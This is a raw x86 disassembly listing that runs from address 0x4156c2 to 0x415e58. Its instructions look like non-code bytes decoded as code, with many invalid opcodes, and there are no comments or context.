  4156c2:	xor    dh,BYTE PTR [esi+esi*8]
  4156c5:	or     edi,DWORD PTR [ebp-0x3f]
  4156c8:	mov    ebx,0x68f19702
  4156cd:	pop    ecx
  4156ce:	rcl    BYTE PTR fs:[ebx],cl
  4156d1:	mov    edx,0xe61d727e
  4156d6:	not    BYTE PTR [ebx]
  4156d8:	lods   al,BYTE PTR ds:[esi]
  4156d9:	not    ah
  4156db:	outs   dx,BYTE PTR ds:[esi]
  4156dc:	loope  0x415735
  4156de:	add    esp,DWORD PTR ds:0xe9fa63e
  4156e4:	pop    ss
  4156e5:	mov    al,0xd9
  4156e7:	pop    ebp
  4156e8:	retf   0x9fdf
  4156eb:	es dec esp
  4156ed:	aam    0xa9
  4156ef:	icebp  
  4156f0:	shl    BYTE PTR [edx],1
  4156f2:	fucomi st,st(4)
  4156f4:	jp     0x415688
  4156f6:	mov    esp,0x631098cf
  4156fb:	mov    edi,0x51fc1278
  415700:	or     ebx,ebx
  415702:	gs mov ah,0xe2
  415705:	or     BYTE PTR [ebx-0x44],0xa8
  415709:	aad    0x75
  41570b:	out    dx,al
  41570c:	out    0xeb,al
  41570e:	sahf   
  41570f:	sub    BYTE PTR [ecx],bl
  415711:	js     0x41570d
  415713:	mov    ds,esp
  415715:	dec    edi
  415716:	adc    al,0x15
  415718:	cmp    ch,BYTE PTR [ebx]
  41571a:	mov    ebp,0xa780769e
  41571f:	inc    edi
  415720:	test   eax,0x8729216d
  415725:	lds    esi,FWORD PTR [ebp+0x31]
  415728:	sbb    DWORD PTR [edi],eax
  41572a:	into   
  41572b:	retf   0xd21c
  41572e:	mov    ebx,DWORD PTR [ebp-0x144b31b7]
  415734:	xchg   ecx,eax
  415735:	or     al,0xc2
  415737:	loop   0x4156e3
  415739:	mov    esi,0xd2828e41
  41573e:	in     eax,0x99
  415740:	imul   ebp,DWORD PTR [ebx-0x77],0x292c27cc
  415747:	loopne 0x415798
  415749:	mov    ds:0x84626f1a,al
  41574e:	jae    0x415788
  415750:	repz push eax
  415752:	pop    esp
  415753:	and    DWORD PTR [esi+0x293d8bc9],ebx
  415759:	call   FWORD PTR [esi-0x43]
  41575c:	out    0x73,eax
  41575e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41575f:	xlat   BYTE PTR ds:[ebx]
  415760:	gs lahf 
  415762:	pop    edi
  415763:	adc    edx,edi
  415765:	arpl   WORD PTR [esi],sp
  415767:	mov    al,ds:0x5291e5c4
  41576c:	adc    eax,edx
  41576e:	push   esi
  41576f:	jo     0x4157ca
  415771:	fwait
  415772:	sbb    DWORD PTR [eax+0x64edd57f],ebp
  415778:	jl     0x415731
  41577a:	mov    cl,0xe9
  41577c:	cmp    eax,0xe04f7037
  415781:	adc    bh,dl
  415783:	mov    eax,0xd1e839bc
  415788:	pop    esp
  415789:	push   esi
  41578a:	sbb    ah,BYTE PTR [eax+0x3f99de42]
  415790:	jmp    0x415749
  415792:	add    DWORD PTR [eax-0x5bddb61c],0x9018840e
  41579c:	lds    esp,FWORD PTR [ebx]
  41579e:	in     eax,0x2e
  4157a0:	mov    ds:0x2b153be6,al
  4157a5:	cwde   
  4157a6:	sbb    al,0x19
  4157a8:	cmp    eax,0x1a8e5e74
  4157ad:	es fwait
  4157af:	push   cs
  4157b0:	(bad)  
  4157b1:	mov    bh,BYTE PTR [ebp+0x23]
  4157b4:	popf   
  4157b5:	lea    esp,[eax+0x0]
  4157b8:	es dec edx
  4157ba:	adc    esi,edx
  4157bc:	xchg   ebp,eax
  4157bd:	inc    ecx
  4157be:	leave  
  4157bf:	xchg   edi,eax
  4157c0:	xor    eax,0xcdb4ebb4
  4157c5:	add    edi,DWORD PTR [ebp-0x4e]
  4157c8:	push   esi
  4157c9:	loop   0x41574d
  4157cb:	mov    dh,0x16
  4157cd:	lods   al,BYTE PTR ds:[esi]
  4157ce:	dec    ebp
  4157cf:	jle    0x41583f
  4157d1:	mov    ch,al
  4157d3:	stos   DWORD PTR es:[edi],eax
  4157d4:	std    
  4157d5:	push   edx
  4157d6:	fadd   st,st(7)
  4157d8:	mov    esi,DWORD PTR [ecx-0x165d020f]
  4157de:	add    ecx,0xffffffd0
  4157e1:	sub    eax,0xdc8387f6
  4157e6:	sbb    dl,BYTE PTR [ebp-0x3d]
  4157e9:	loopne 0x4157ce
  4157eb:	lea    ecx,[edx+0x5e2a63c]
  4157f1:	inc    ebx
  4157f2:	push   0x62
  4157f4:	ja     0x4157e1
  4157f6:	outs   dx,BYTE PTR ds:[esi]
  4157f7:	sbb    ah,BYTE PTR [edi+0x6a]
  4157fa:	sti    
  4157fb:	aad    0x39
  4157fd:	stos   BYTE PTR es:[edi],al
  4157fe:	dec    edx
  4157ff:	jecxz  0x4157c5
  415801:	rcr    dl,0x6a
  415804:	or     eax,0xbdef873c
  415809:	sbb    al,0xfe
  41580b:	or     ch,BYTE PTR [esi-0x229792b3]
  415811:	cmc    
  415812:	into   
  415813:	fwait
  415814:	jmp    0x4157ef
  415816:	ror    BYTE PTR [edi+ecx*4+0x26],1
  41581a:	fisttp DWORD PTR [eax]
  41581c:	pushf  
  41581d:	stc    
  41581e:	xchg   esi,eax
  41581f:	int    0x58
  415821:	sub    al,0x99
  415823:	(bad)  
  415824:	daa    
  415825:	and    ebx,ebp
  415827:	push   0xffffff98
  415829:	test   BYTE PTR [edi+0x51],bh
  41582c:	dec    eax
  41582d:	in     eax,dx
  41582e:	xor    bh,BYTE PTR [ebp+0x46a50534]
  415834:	mov    ds:0xf6fa39e6,eax
  415839:	sub    eax,0x7c472736
  41583e:	jp     0x415866
  415840:	mov    al,ds:0x7c8e65ce
  415845:	mov    ?,WORD PTR [edx]
  415847:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415848:	add    ebx,edi
  41584a:	and    ebx,DWORD PTR [edx+0xa]
  41584d:	lahf   
  41584e:	addr16 sub dh,cl
  415851:	lods   al,BYTE PTR ds:[esi]
  415852:	sbb    bh,dh
  415854:	add    BYTE PTR [eax+ecx*1],0xe2
  415858:	mov    eax,ds:0xb93f9709
  41585d:	xchg   ecx,eax
  41585e:	or     al,0xb
  415860:	add    al,0x35
  415862:	jae    0x415879
  415864:	ja     0x415857
  415866:	jmp    0x77789e7c
  41586b:	fsub   st(0),st
  41586d:	xor    dl,BYTE PTR [edi]
  41586f:	xchg   edx,eax
  415870:	adc    DWORD PTR [ecx+0x44],ecx
  415873:	test   eax,0x7f5a0e3
  415878:	xchg   DWORD PTR [ebp-0xac688b3],esp
  41587e:	cld    
  41587f:	sub    ebx,DWORD PTR ds:0xadf96625
  415885:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415886:	ins    BYTE PTR es:[edi],dx
  415887:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415888:	mov    esi,0xa47235f0
  41588d:	mov    ecx,0xe5de50e8
  415892:	icebp  
  415893:	(bad)  
  415894:	mov    al,ds:0x76210c4c
  415899:	jge    0x4158ca
  41589b:	retf   0xd419
  41589e:	pop    ebp
  41589f:	add    BYTE PTR ds:0xadf779e0,dh
  4158a5:	loop   0x415869
  4158a7:	outs   dx,BYTE PTR ds:[esi]
  4158a8:	cwde   
  4158a9:	mov    eax,ds:0xdd219468
  4158ae:	fs addr16 out 0x9f,al
  4158b2:	out    dx,al
  4158b3:	add    DWORD PTR [ebx+0x4bda5dc4],esp
  4158b9:	rcr    al,cl
  4158bb:	gs mov dh,0xab
  4158be:	popf   
  4158bf:	jg     0x415936
  4158c1:	dec    ebx
  4158c2:	ds call 0x1d8072d7
  4158c8:	cmp    ecx,ebp
  4158ca:	adc    eax,0xed2ed3ed
  4158cf:	hlt    
  4158d0:	idiv   BYTE PTR ds:0xeeecf523
  4158d6:	push   ecx
  4158d7:	lods   eax,DWORD PTR ds:[esi]
  4158d8:	mov    ecx,0xdbdd3b41
  4158dd:	rcl    ebx,cl
  4158df:	sub    DWORD PTR [edi],ecx
  4158e1:	fst    QWORD PTR [esi-0x25]
  4158e4:	in     al,0x99
  4158e6:	loope  0x415911
  4158e8:	ret    0xa60e
  4158eb:	xchg   edx,eax
  4158ec:	add    BYTE PTR [esi+0x6f7ceb63],al
  4158f2:	test   DWORD PTR [ebx+0x4b947b96],edi
  4158f8:	je     0x4158ef
  4158fa:	imul   ebx,edi,0x7a
  4158fd:	das    
  4158fe:	mov    eax,DWORD PTR [esp+eax*1]
  415901:	mov    bh,0x74
  415903:	scas   al,BYTE PTR es:[edi]
  415904:	fwait
  415905:	dec    ebx
  415906:	push   eax
  415907:	xchg   esi,eax
  415908:	cmc    
  415909:	in     eax,0x40
  41590b:	imul   ebp,edx,0x3977d793
  415911:	sub    cl,dl
  415913:	jmp    0x6a3c:0x255a1fdb
  41591a:	ret    
  41591b:	or     eax,0x6f773334
  415920:	pop    esp
  415921:	push   0xf8489a69
  415926:	mov    ecx,0x8c66ab0
  41592b:	jnp    0x41591e
  41592d:	inc    ebx
  41592e:	jle    0x415964
  415930:	jo     0x41592c
  415932:	mul    dh
  415934:	int3   
  415935:	outs   dx,DWORD PTR ds:[esi]
  415936:	inc    ebx
  415937:	mov    WORD PTR [ecx+0x4eb7c97d],gs
  41593d:	fadd   QWORD PTR [ecx+ecx*8]
  415940:	adc    bh,dl
  415942:	(bad)  
  415944:	cmp    ah,BYTE PTR [ecx+0x1ba5a99a]
  41594a:	mov    ebp,0x8a9cfefd
  41594f:	adc    BYTE PTR [ebp-0x28],dl
  415952:	pop    esp
  415953:	outs   dx,DWORD PTR ds:[esi]
  415954:	jbe    0x415956
  415956:	inc    ecx
  415957:	ret    0x6fc6
  41595a:	or     ah,BYTE PTR [edx*8+0x21112323]
  415961:	push   ebp
  415962:	cwde   
  415963:	outs   dx,DWORD PTR ds:[esi]
  415964:	dec    ebx
  415965:	mov    bh,bl
  415967:	stos   BYTE PTR es:[edi],al
  415968:	cmp    al,0xb1
  41596a:	adc    BYTE PTR [ebp-0x74],0x65
  41596e:	fisubr DWORD PTR [ebp+0x39]
  415971:	dec    esp
  415972:	pushf  
  415973:	cld    
  415974:	mov    ds:0xc921bb5c,al
  415979:	int    0x3e
  41597b:	dec    ecx
  41597c:	pop    eax
  41597d:	jbe    0x4159da
  41597f:	cmp    BYTE PTR [edx+0x3a],0x95
  415983:	rcl    BYTE PTR [ebp+0x3486c373],cl
  415989:	push   edi
  41598a:	popf   
  41598b:	jnp    0x415958
  41598d:	pop    edi
  41598e:	jg     0x4159ab
  415990:	pop    ecx
  415991:	sub    cl,al
  415993:	jmp    0x8b98:0xce50d09b
  41599a:	mov    ebx,0x26a955e5
  41599f:	sahf   
  4159a0:	push   eax
  4159a1:	mov    ds:0x4d8b3ea8,eax
  4159a6:	jno    0x415939
  4159a8:	jo     0x41598e
  4159aa:	or     BYTE PTR [eax+0x43623e7f],dl
  4159b0:	iret   
  4159b1:	outs   dx,BYTE PTR ds:[esi]
  4159b2:	pop    edx
  4159b3:	mov    cl,0x78
  4159b5:	aam    0xa8
  4159b7:	test   al,0x1e
  4159b9:	dec    esi
  4159ba:	xor    BYTE PTR [edi+0x12071702],dh
  4159c0:	das    
  4159c1:	mov    ah,0xff
  4159c3:	jnp    0x41597d
  4159c5:	and    eax,0x2c16075f
  4159ca:	(bad)  
  4159cc:	mov    al,ds:0x41862fa6
  4159d1:	inc    edi
  4159d2:	aad    0xef
  4159d4:	dec    esi
  4159d5:	cmp    eax,0xef336bba
  4159da:	(bad)  [eax]
  4159dc:	push   ebx
  4159dd:	mov    DWORD PTR [edi-0x1],eax
  4159e0:	mov    eax,ds:0x9459d79c
  4159e5:	lea    ebx,[ebp-0xc5e30a0]
  4159eb:	pop    ecx
  4159ec:	xor    al,0x89
  4159ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4159ef:	cmc    
  4159f0:	repz push ss
  4159f2:	inc    ebx
  4159f3:	and    DWORD PTR [ebx+0x70af107c],ecx
  4159f9:	mov    edx,0x4503b492
  4159fe:	inc    eax
  4159ff:	xchg   ebp,eax
  415a00:	sbb    al,0xec
  415a02:	dec    eax
  415a03:	cs jmp 0x415a05
  415a06:	cwde   
  415a07:	stos   DWORD PTR es:[edi],eax
  415a08:	icebp  
  415a09:	mov    edi,0xb0eed390
  415a0e:	dec    ebp
  415a0f:	mov    ah,0xd8
  415a11:	jge    0x415a07
  415a13:	ds hlt 
  415a15:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415a16:	mov    ah,BYTE PTR ds:0xdffe27be
  415a1c:	ja     0x415a43
  415a1e:	fistp  WORD PTR [ecx+0x4538dfae]
  415a24:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415a25:	xchg   esp,eax
  415a26:	aaa    
  415a27:	enter  0xd8c1,0x25
  415a2b:	inc    esi
  415a2c:	inc    edi
  415a2d:	(bad)  
  415a2e:	in     eax,dx
  415a2f:	add    al,0x57
  415a31:	inc    esi
  415a32:	in     al,dx
  415a33:	aad    0xbf
  415a35:	popa   
  415a36:	dec    edx
  415a37:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415a38:	adc    DWORD PTR [edi-0x60],0xca4ef316
  415a3f:	adc    eax,0x9
  415a42:	rcr    DWORD PTR [ebx-0x57e57f95],1
  415a48:	dec    esi
  415a49:	pop    es
  415a4a:	push   edi
  415a4b:	mov    ds:0x59478333,eax
  415a50:	jge    0x415a19
  415a52:	int    0x58
  415a54:	lods   al,BYTE PTR ds:[esi]
  415a55:	xor    bl,ah
  415a57:	jg     0x415a9e
  415a59:	push   edi
  415a5a:	in     al,0x5c
  415a5c:	pushf  
  415a5d:	test   eax,0x5a49eed6
  415a62:	lods   eax,DWORD PTR ds:[esi]
  415a63:	popf   
  415a64:	cld    
  415a65:	sbb    DWORD PTR [ebx],ebx
  415a67:	inc    DWORD PTR [edx-0x4342887e]
  415a6d:	mov    ebp,0xd2f51df4
  415a72:	push   esp
  415a73:	(bad)  
  415a74:	or     eax,0xd2a54831
  415a79:	pop    ss
  415a7a:	jg     0x415acc
  415a7c:	stos   BYTE PTR es:[edi],al
  415a7d:	icebp  
  415a7e:	jle    0x415aa4
  415a80:	sub    ch,BYTE PTR [eax+0x46]
  415a83:	bound  edi,QWORD PTR [edx+ecx*4+0x4a50ccd8]
  415a8a:	adc    cl,0xd2
  415a8d:	ja     0x415a66
  415a8f:	mov    cl,0xf4
  415a91:	and    eax,0x3f13cbcd
  415a96:	push   edi
  415a97:	and    ch,al
  415a99:	pop    ecx
  415a9a:	stos   DWORD PTR es:[edi],eax
  415a9b:	enter  0xea13,0x96
  415a9f:	push   cs
  415aa0:	data16 jbe 0x415ada
  415aa3:	mov    al,0xc3
  415aa5:	mov    WORD PTR [ebx-0x12],fs
  415aa8:	out    0xb1,eax
  415aaa:	cli    
  415aab:	cld    
  415aac:	out    dx,al
  415aad:	lods   al,BYTE PTR es:[esi]
  415aaf:	mov    al,0x10
  415ab1:	stc    
  415ab2:	js     0x415b0d
  415ab4:	lods   eax,DWORD PTR ds:[esi]
  415ab5:	aad    0x62
  415ab7:	fiadd  WORD PTR [ebp+0x1f]
  415aba:	dec    esp
  415abb:	xchg   DWORD PTR [ecx],esi
  415abd:	pop    edi
  415abe:	test   BYTE PTR ds:0xf6162550,dl
  415ac4:	ror    dh,0xa7
  415ac7:	(bad)  
  415ac9:	inc    edx
  415aca:	mov    bl,0x9b
  415acc:	fwait
  415acd:	jge    0x415ae7
  415acf:	mov    edi,0x2b6f1257
  415ad4:	pop    eax
  415ad5:	xchg   ebx,eax
  415ad6:	xchg   esi,eax
  415ad7:	out    0x37,eax
  415ad9:	js     0x415a65
  415adb:	pop    edx
  415adc:	cs out dx,eax
  415ade:	pop    esi
  415adf:	(bad)  
  415ae0:	push   edi
  415ae1:	in     eax,dx
  415ae2:	push   ecx
  415ae3:	popa   
  415ae4:	loope  0x415a98
  415ae6:	clc    
  415ae7:	loope  0x415aea
  415ae9:	enter  0x96dd,0x5d
  415aed:	adc    eax,0x43fa2665
  415af2:	mov    esi,0x1b7cad17
  415af7:	ror    BYTE PTR [eax-0x4b],1
  415afa:	xor    al,0x8d
  415afc:	lahf   
  415afd:	aad    0xa3
  415aff:	scas   al,BYTE PTR es:[edi]
  415b00:	adc    DWORD PTR [ebx],ebp
  415b02:	test   BYTE PTR [ecx-0x5bd2cddd],ch
  415b08:	push   eax
  415b09:	mov    ds:0x5fb2362e,al
  415b0e:	pop    es
  415b0f:	sbb    eax,0x193aa14d
  415b14:	adc    ch,BYTE PTR [edx-0x58]
  415b17:	xchg   esi,eax
  415b18:	retf   0xf6ea
  415b1b:	mov    dh,0x8a
  415b1d:	fnstsw WORD PTR [edi+0x23]
  415b20:	pop    esp
  415b21:	and    DWORD PTR [edx],edi
  415b23:	xchg   ecx,eax
  415b24:	test   eax,0x4ed35ce
  415b29:	cmp    BYTE PTR [ebp+0x2bce2f53],ch
  415b2f:	cs pop ebx
  415b31:	jb     0x415ab3
  415b33:	mov    bl,0x54
  415b35:	mov    edx,0x557b0a6d
  415b3a:	cmp    eax,0x7b815ef8
  415b3f:	xchg   ecx,eax
  415b40:	sub    edx,ecx
  415b42:	bound  edx,QWORD PTR [edi]
  415b44:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415b45:	mov    BYTE PTR [eax+0x3d],bl
  415b48:	lods   eax,DWORD PTR ds:[esi]
  415b49:	es pop ebx
  415b4b:	loope  0x415b73
  415b4d:	bound  ecx,QWORD PTR [edx+0x1f]
  415b50:	outs   dx,BYTE PTR ds:[esi]
  415b51:	inc    ebx
  415b52:	fmulp  st(6),st
  415b54:	mov    ds:0xfd13f133,eax
  415b59:	lods   eax,DWORD PTR ds:[esi]
  415b5b:	jg     0x415ba2
  415b5d:	jb     0x415af3
  415b5f:	scas   al,BYTE PTR es:[edi]
  415b60:	mov    edi,0xf395c52c
  415b65:	mov    si,0x5cba
  415b69:	pop    edi
  415b6a:	ja     0x415b92
  415b6c:	dec    esp
  415b6d:	mov    bh,0x47
  415b6f:	mov    ebx,0xb301f54b
  415b74:	ss cmp al,0xf5
  415b77:	js     0x415b9d
  415b79:	and    BYTE PTR [ecx+0x7ee96026],ah
  415b7f:	js     0x415bbf
  415b81:	dec    BYTE PTR [ebp+0x5c]
  415b84:	adc    al,0x5
  415b86:	retf   
  415b87:	fimul  WORD PTR [ebx]
  415b89:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415b8a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415b8b:	and    al,0x4
  415b8d:	repz lock into 
  415b90:	out    0x2f,eax
  415b92:	sub    esi,DWORD PTR [esi]
  415b94:	lahf   
  415b95:	pusha  
  415b96:	xor    eax,eax
  415b98:	pop    edx
  415b99:	outs   dx,DWORD PTR fs:[esi]
  415b9b:	es cmp eax,0xb519f975
  415ba1:	and    DWORD PTR [edi+0x11],0xcad1c9b1
  415ba8:	push   ecx
  415ba9:	enter  0x7c42,0xc
  415bad:	jmp    0x415c14
  415baf:	push   edi
  415bb0:	mov    edi,0x9910305d
  415bb5:	cmp    DWORD PTR ds:[esi+0x111abc5f],ecx
  415bbc:	enter  0xe898,0xc9
  415bc0:	pop    es
  415bc1:	mov    cl,0x75
  415bc3:	inc    esp
  415bc4:	ror    BYTE PTR [ebx-0x5444ddd],0x86
  415bcb:	mov    edi,0x66f7b91e
  415bd0:	sbb    DWORD PTR [ebx-0x1383dd9],esp
  415bd6:	push   esp
  415bd7:	or     al,0x78
  415bd9:	add    eax,0x925065c1
  415bde:	outs   dx,DWORD PTR ds:[esi]
  415bdf:	and    ebx,DWORD PTR [ebp+0x3e]
  415be2:	cli    
  415be3:	arpl   WORD PTR [ebx],bp
  415be5:	adc    BYTE PTR [eax],bh
  415be7:	ffreep st(1)
  415be9:	fcomip st,st(4)
  415beb:	rcr    DWORD PTR [edi+eax*1-0x6fc70f20],1
  415bf2:	lds    edi,FWORD PTR [ebx-0xf]
  415bf5:	jbe    0x415c3b
  415bf7:	adc    al,0xbc
  415bf9:	dec    esp
  415bfa:	fnstcw WORD PTR [ecx+0x78da3d8c]
  415c00:	or     eax,0x30455f5c
  415c05:	lea    esi,[ebx-0x32707515]
  415c0b:	pop    esp
  415c0c:	ins    DWORD PTR es:[edi],dx
  415c0d:	dec    eax
  415c0e:	pop    ebp
  415c0f:	xchg   cl,dl
  415c11:	test   BYTE PTR [eax],ch
  415c13:	aas    
  415c14:	xor    esp,DWORD PTR [ecx+0x28]
  415c17:	add    eax,0x5c053c9a
  415c1c:	xlat   BYTE PTR ds:[ebx]
  415c1d:	mov    DWORD PTR [ebp+0x7899e0c4],ecx
  415c23:	and    DWORD PTR [esi],eax
  415c25:	mov    esi,0x7117251d
  415c2a:	push   edi
  415c2b:	mov    ecx,0x49fbb33d
  415c30:	inc    edi
  415c31:	jmp    0x6b16:0xdef89351
  415c38:	mov    gs,WORD PTR [edi]
  415c3a:	leave  
  415c3b:	mov    eax,0xdac83cc0
  415c40:	dec    edx
  415c41:	jl     0x415c0d
  415c43:	pop    edx
  415c44:	dec    ecx
  415c45:	push   ss
  415c46:	add    edi,esi
  415c48:	xchg   esp,eax
  415c49:	add    bh,BYTE PTR [edi+0x1d1aeca6]
  415c4f:	mov    fs,WORD PTR [ebp-0x59]
  415c52:	mov    dh,0x2f
  415c54:	scas   eax,DWORD PTR es:[edi]
  415c55:	dec    esi
  415c56:	aam    0xa9
  415c58:	sub    ecx,edx
  415c5a:	or     eax,0xfe1831cb
  415c5f:	jmp    0x415c2e
  415c61:	jl     0x415bf7
  415c63:	repz mov edx,0xcbf0b6c0
  415c69:	push   ebx
  415c6a:	mov    cl,BYTE PTR [bx+0x24]
  415c6e:	xchg   edi,eax
  415c6f:	push   ss
  415c70:	lahf   
  415c71:	jge    0x415c68
  415c73:	bound  edi,QWORD PTR [ebp+0x2]
  415c76:	and    BYTE PTR [eax-0x6f0ba487],0x77
  415c7d:	aam    0xfc
  415c7f:	jns    0x415cf1
  415c81:	into   
  415c82:	loope  0x415c96
  415c84:	in     al,dx
  415c85:	(bad)  
  415c86:	in     eax,dx
  415c87:	inc    ebp
  415c88:	xchg   esi,eax
  415c89:	jge    0x415cb5
  415c8b:	iret   
  415c8c:	jg     0x415d0a
  415c8e:	and    BYTE PTR [edx],0x16
  415c91:	jge    0x415c7d
  415c93:	add    BYTE PTR [edi-0x5afe7853],bh
  415c99:	pop    ebx
  415c9a:	sub    al,0xd6
  415c9c:	dec    esi
  415c9d:	pop    ss
  415c9e:	sbb    BYTE PTR [ecx-0x209f1d4b],dh
  415ca4:	out    dx,eax
  415ca5:	loopne 0x415c96
  415ca7:	and    eax,0x84db5a88
  415cac:	jp     0x415c9e
  415cae:	(bad)  
  415caf:	pop    eax
  415cb0:	hlt    
  415cb1:	shl    BYTE PTR [ecx],cl
  415cb3:	scas   al,BYTE PTR es:[edi]
  415cb4:	mov    dl,BYTE PTR [esi]
  415cb6:	sar    BYTE PTR [ebx-0x63],cl
  415cb9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415cba:	or     BYTE PTR ds:0xb63d030c,bh
  415cc0:	rcr    DWORD PTR [edi],0x55
  415cc3:	inc    ebx
  415cc4:	mov    ebx,0x7b67920a
  415cc9:	mov    BYTE PTR [eax+0x4c00a45a],ah
  415ccf:	xchg   ebx,eax
  415cd0:	lods   eax,DWORD PTR ds:[esi]
  415cd1:	and    bh,ah
  415cd3:	stos   DWORD PTR es:[edi],eax
  415cd4:	int3   
  415cd5:	add    ebp,esp
  415cd7:	sysexit 
  415cd9:	cmp    eax,0xf9a60ebf
  415cde:	or     bl,cl
  415ce0:	xchg   BYTE PTR [eax-0x2b8ec3c3],ah
  415ce6:	sub    al,0xd8
  415ce8:	(bad)  
  415ce9:	jecxz  0x415d68
  415ceb:	mov    ah,0x82
  415ced:	push   ecx
  415cee:	dec    sp
  415cf0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415cf1:	or     ch,ch
  415cf3:	mov    al,0x68
  415cf5:	jl     0x415d21
  415cf7:	enter  0x233d,0x53
  415cfb:	pushf  
  415cfc:	jnp    0x415d2c
  415cfe:	jmp    0x1e80a5ca
  415d03:	mov    ?,WORD PTR [ebx-0x42]
  415d06:	lods   al,BYTE PTR ds:[esi]
  415d07:	pop    ss
  415d08:	sub    eax,DWORD PTR [eax]
  415d0a:	jp     0x415d7a
  415d0c:	ss jo  0x415ca2
  415d0f:	xlat   BYTE PTR ds:[ebx]
  415d10:	push   ebp
  415d11:	ins    BYTE PTR es:[edi],dx
  415d12:	mov    al,BYTE PTR ds:0x7c7dcefb
  415d18:	stos   BYTE PTR es:[edi],al
  415d19:	fldl2e 
  415d1b:	pop    es
  415d1c:	and    bh,BYTE PTR [ecx]
  415d1e:	mov    DWORD PTR [eax],ebx
  415d20:	fcmovu st,st(4)
  415d22:	xchg   ebx,eax
  415d23:	push   es
  415d24:	xchg   BYTE PTR [edi-0x2e155a1d],dl
  415d2a:	(bad)  
  415d2c:	jo     0x415d3f
  415d2e:	xchg   BYTE PTR [esi+0x5f],bl
  415d31:	cmp    eax,0x326ad72c
  415d36:	mov    dl,0x26
  415d38:	mov    ebp,0xe9c1c869
  415d3d:	sti    
  415d3e:	lods   eax,DWORD PTR ds:[esi]
  415d3f:	adc    ecx,0x3fbb7867
  415d45:	sub    ecx,DWORD PTR ds:0xa12247ef
  415d4b:	std    
  415d4c:	(bad)  
  415d4d:	push   ebx
  415d4e:	outs   dx,DWORD PTR ds:[esi]
  415d4f:	jle    0x415d2e
  415d51:	in     eax,dx
  415d52:	lahf   
  415d53:	jns    0x415d27
  415d55:	push   0xffffff81
  415d57:	add    edx,edx
  415d59:	test   BYTE PTR [ebx+0x79ece27],0xfd
  415d60:	add    DWORD PTR [ebp+0x3ad64b9a],edi
  415d66:	inc    esi
  415d67:	push   esi
  415d68:	scas   al,BYTE PTR es:[edi]
  415d69:	push   es
  415d6a:	sbb    DWORD PTR [eax],edi
  415d6c:	mov    bl,0xea
  415d6e:	das    
  415d6f:	outs   dx,BYTE PTR ds:[esi]
  415d70:	fistp  WORD PTR [edx-0x76]
  415d73:	scas   eax,DWORD PTR es:[edi]
  415d74:	mov    ah,BYTE PTR [ebx+eiz*8-0x210e451b]
  415d7b:	sbb    ah,bl
  415d7d:	adc    dl,BYTE PTR [ecx+0x43a0edec]
  415d83:	les    eax,FWORD PTR [esi+ebp*2]
  415d86:	mov    al,0xd8
  415d88:	adc    BYTE PTR [edx+esi*2-0x51],0xe8
  415d8d:	add    cl,bl
  415d8f:	xchg   DWORD PTR [ebx],edi
  415d91:	pop    ebp
  415d92:	push   0xffffffe0
  415d94:	or     BYTE PTR [eax],al
  415d96:	arpl   ax,cx
  415d98:	das    
  415d99:	jecxz  0x415e06
  415d9b:	pop    ds
  415d9c:	jecxz  0x415ddc
  415d9e:	into   
  415d9f:	dec    ebp
  415da0:	xchg   esp,eax
  415da1:	out    dx,eax
  415da2:	sub    DWORD PTR [edx],0xffffffdb
  415da5:	out    0x14,eax
  415da7:	sbb    eax,DWORD PTR [ebp+0x6a]
  415daa:	ins    DWORD PTR es:[edi],dx
  415dab:	jb     0x415da1
  415dad:	bound  esp,QWORD PTR [ecx-0x31]
  415db0:	mov    eax,0x19af3f6
  415db5:	stos   BYTE PTR es:[edi],al
  415db6:	ins    BYTE PTR es:[edi],dx
  415db7:	sbb    cl,BYTE PTR [esi+0x66]
  415dba:	scas   al,BYTE PTR es:[edi]
  415dbb:	mov    dh,0x98
  415dbd:	inc    edx
  415dbe:	popa   
  415dbf:	xlat   BYTE PTR ds:[ebx]
  415dc0:	mov    al,ds:0x4a0d0643
  415dc5:	sbb    al,0x67
  415dc7:	test   eax,0xfe41091c
  415dcc:	loope  0x415dca
  415dce:	mov    bl,0x18
  415dd0:	inc    edx
  415dd1:	loop   0x415dc0
  415dd3:	(bad)  
  415dd4:	es sti 
  415dd6:	ret    0x8023
  415dd9:	stos   DWORD PTR es:[edi],eax
  415dda:	sub    dl,dl
  415ddc:	pop    es
  415ddd:	inc    ebp
  415dde:	psllq  mm4,QWORD PTR [ebp+0xc6051e9]
  415de5:	adc    al,0x74
  415de7:	sub    eax,0x39a0e513
  415dec:	jmp    0x7250170b
  415df1:	and    ebp,esp
  415df3:	in     eax,0xe6
  415df5:	cmp    DWORD PTR [ecx+0x1ff68c59],0x8b960e25
  415dff:	ror    DWORD PTR [edx+0x3faafaf3],cl
  415e05:	jp     0x415d9e
  415e07:	sub    DWORD PTR [esi],esi
  415e09:	push   ds
  415e0a:	xor    esp,DWORD PTR [ebx]
  415e0c:	outs   dx,DWORD PTR ds:[esi]
  415e0d:	pop    ebx
  415e0e:	inc    eax
  415e0f:	xor    eax,0x97217b62
  415e14:	push   eax
  415e15:	add    BYTE PTR [ecx-0x3bdcafab],0x5a
  415e1c:	cmp    ebx,DWORD PTR ds:0x8f096230
  415e22:	add    al,0xe1
  415e24:	push   eax
  415e25:	inc    esi
  415e26:	loopne 0x415ddd
  415e28:	sbb    BYTE PTR [esp+eax*4+0x156f8853],bl
  415e2f:	mov    bl,0xc3
  415e31:	jmp    0xfbdc994f
  415e36:	or     bh,dl
  415e38:	fwait
  415e39:	loope  0x415e90
  415e3b:	test   BYTE PTR [edi],dh
  415e3d:	and    al,0x67
  415e3f:	jg     0x415ea0
  415e41:	push   ds
  415e42:	cmp    DWORD PTR [ebp-0x535fe515],esi
  415e48:	test   eax,0xc73c5568
  415e4d:	mov    BYTE PTR [ecx],bh
  415e4f:	or     BYTE PTR [eax+0x1d],ah
  415e52:	sbb    al,0xb0
  415e54:	cmp    BYTE PTR [edx+0x36],0xcf
  415e58:	jge    0x415ec9
